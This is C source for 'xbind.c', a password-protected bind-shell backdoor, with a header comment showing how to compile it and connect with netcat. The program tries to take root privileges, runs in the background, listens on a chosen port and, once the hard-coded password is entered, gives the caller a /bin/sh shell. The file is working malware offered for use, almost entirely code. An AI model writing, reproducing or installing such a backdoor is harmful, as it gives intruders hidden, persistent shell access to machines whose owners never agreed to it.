/*------------------------------------------------------

EXP:
server:
gcc -o xbind xbind.c
./xbind 1993

hack:
C:\>nc -vv 192.168.1.52 1993
.168.1.52: inverse host lookup failed: h_errno 11004: NO_DATA
(UNKNOWN) [192.168.1.52] 1993 (?) open
Enert your password:SBST
Welcome to backdoor
let's do it:
-------------------------------------------------------*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ENTERPASS "Enert your password: \0"
#define WELCOME  "Welcome to backdoor\r\nlet's do it:\r\n"
#define PASSWORD "SBST"  //密码在这！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
int main(int argc, char **argv)
{
   struct sockaddr_in s_addr;
    struct sockaddr_in c_addr;
    char buf[1024];
   pid_t pid;
   int i,sock_descriptor,temp_sock_descriptor,c_addrsize;

   setuid(0);
    setgid(0);
   seteuid(0);
   setegid(0);

if (argc!=2){
   printf("=================================\r\n");
   printf("|xbind.c by pr0cess\r\n");
   printf("|Usage:\r\n");
   printf("|./xbind 1993\r\n");
   printf("|nc -vv targetIP 1993\r\n");
   printf("|enter the password to get shell\r\n");
   printf("|Have a nice day;)\r\n");
   printf("=================================\r\n");
   exit(1);

}
if (fork()){
   exit(0);
}

sock_descriptor=socket(AF_INET,SOCK_STREAM,0);   
if (socket(AF_INET,SOCK_STREAM,0)==-1){
   printf("socket failed!");
   exit(1);
}
memset(&s_addr,0,sizeof(s_addr));
//bzero(&s_addr,sizeof(s_addr));
s_addr.sin_family=AF_INET;
s_addr.sin_addr.s_addr=htonl(INADDR_ANY);
s_addr.sin_port=htons(atoi(argv[1]));
if (bind(sock_descriptor,(struct sockaddr *)&s_addr,sizeof(s_addr))==-1){
   printf("bind failed!");
   exit(1);
}
if (listen(sock_descriptor,20)==-1)//accept 20 connections
{
   printf("listen failed!");
   exit(1);
}
c_addrsize=sizeof(c_addr);
temp_sock_descriptor=accept(sock_descriptor,(struct sockaddr *)&c_addr,&c_addrsize);
//recv
while(temp_sock_descriptor){
   pid=fork();
   if (pid>0) {
      close(temp_sock_descriptor);
      continue;
   }else if (pid==0){
      write(temp_sock_descriptor, ENTERPASS, strlen(ENTERPASS));
      memset(buf, '\0', 1024);
      recv(temp_sock_descriptor, buf, 1024, 0);

      if (strncmp(buf,PASSWORD,5) !=0){
         close(temp_sock_descriptor);
         exit(1);
      }

      write(temp_sock_descriptor, WELCOME, strlen(WELCOME));
      dup2(temp_sock_descriptor,0);
      dup2(temp_sock_descriptor,1);
      dup2(temp_sock_descriptor,2);
      execl("/bin/sh", "sh", (char *) 0);
      close(temp_sock_descriptor);
      exit(0);
   }else{   

      exit(1);
   }
}

close(sock_descriptor);
   return 0;
}